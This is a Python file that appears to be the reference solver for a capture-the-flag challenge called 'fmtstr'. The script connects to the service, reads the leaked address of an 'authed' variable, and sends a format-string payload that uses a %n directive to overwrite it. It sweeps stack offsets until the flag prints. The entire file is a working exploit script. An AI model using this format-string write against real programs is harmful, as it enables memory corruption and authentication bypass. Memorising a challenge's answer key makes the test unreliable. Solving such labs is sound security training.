"""Reference solver for fmtstr: format-string arbitrary write of `authed`.

    python3 solve.py <host> <port>

The binary prints &authed (non-PIE, fixed) and does printf(buf) on your input.
We overwrite authed with a non-zero value via %n. The address contains null
bytes, so it goes at the END of the payload (standard technique); the format
directives before it stay null-free. The stack argument offset of our buffer is
unknown, so we sweep it and stop when the flag prints.
"""
import re
import socket
import struct
import sys
import time

BODY = 24        # bytes of format directives before the appended address (3 slots)


def attempt(host, port, off):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((host, port))
        banner = b""
        while b"fmt>" not in banner:
            chunk = s.recv(4096)
            if not chunk:
                s.close(); return None
            banner += chunk
    except (socket.timeout, ConnectionError, OSError):
        try: s.close()
        except OSError: pass
        return None
    m = re.search(rb"authed is at (0x[0-9a-fA-F]+)", banner)
    if not m:
        s.close(); return None
    authed = int(m.group(1), 16)
    pos = off + BODY // 8                     # arg index of the appended address
    directive = ("%" + str(pos) + "$n").encode()
    body = b"." * (BODY - len(directive)) + directive     # dots printed => nonzero %n
    payload = body + struct.pack("<Q", authed)
    try:
        s.sendall(payload + b"\n")
        time.sleep(0.2)
        out = b""
        s.settimeout(2)
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except (socket.timeout, ConnectionError, OSError):
        pass
    finally:
        s.close()
    mm = re.search(rb"flag\{[^}]*\}", out)
    return mm.group(0).decode() if mm else None


def main():
    host, port = sys.argv[1], int(sys.argv[2])
    for off in range(6, 40):
        flag = attempt(host, port, off)
        if flag:
            print(flag)
            return
    print("no offset in range triggered the write", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
